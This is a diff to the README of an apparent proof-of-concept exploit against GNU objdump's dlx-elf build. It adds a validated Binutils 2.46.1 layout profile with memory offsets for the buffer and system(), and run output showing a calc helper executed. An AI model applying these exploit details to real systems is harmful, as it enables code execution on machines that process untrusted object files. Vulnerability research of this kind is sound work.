@@ -10,6 +10,14 @@ Tested against a binutils-gdb master build from commit:
 c311f4d37f31ff3fbb5db6923abcdf93bb75a37b
 ```
 
+Also validated against the official GNU Binutils 2.46.1 release tarball with a
+clean `dlx-elf` objdump build:
+
+```text
+GNU objdump (GNU Binutils) 2.46.1
+elf32-dlx
+```
+
 ## whats in here
 
 - `payloads/*.bin` - crafted ELF/DLX object files to feed to `objdump`
@@ -27,10 +35,17 @@ The payload files are named `.bin` because they are raw binary files, but the fi
 
 ASLR stays on. Because of that, one exact payload is not guaranteed to land every time. The files in `payloads/` are a small set of guesses for the address layout seen during testing.
 
-The generator emits the original profile plus a WSL/Ubuntu 24.04 profile measured against the pinned `dlx-elf` build. The second profile keeps ASLR on but uses stable relative offsets observed in the target process:
+The generator emits the original profile, a WSL/Ubuntu 24.04 profile measured
+against the pinned `dlx-elf` build, and a profile measured against a clean GNU
+Binutils 2.46.1 `dlx-elf` build. The profiles keep ASLR on but use stable
+relative offsets observed in the target process:
 
 ```text
 layout=wsl2404 off_io=-0x3690 off_sec=0xbb0 rbase=0x220
+buf_delta=0x702fff00 or 0x6f300000
+system_delta=0x7042e500 or 0x7043e4ff
+
+layout=gnu2461 off_io=-0x3690 off_sec=0xbb8 rbase=0x190 sec_size_offset=0x40
 buf_delta=0x702fff00 or 0x6f300000
 system_delta=0x7042e500 or 0x7043e4ff
 ```
@@ -38,6 +53,13 @@ system_delta=0x7042e500 or 0x7043e4ff
 That is an ASLR-on relative-delta strategy, not a universal single-shot info-leak bypass. A miss can still happen, so the runner keeps the retry loop.
 
 More detail is in `docs/aslr-bypass-analysis.md`.
+
+The `gnu2461` profile was validated with the existing runner:
+
+```text
+HIT try=1 payload=.../payloads/dlx_calc_aslr_gnu2461_f05_b702fff00_s7042e500.bin
+CALC_HELPER_RAN 2026-06-25T11:14:27Z
+```
 
 So a plain crash like this does not always mean the PoC failed:
 
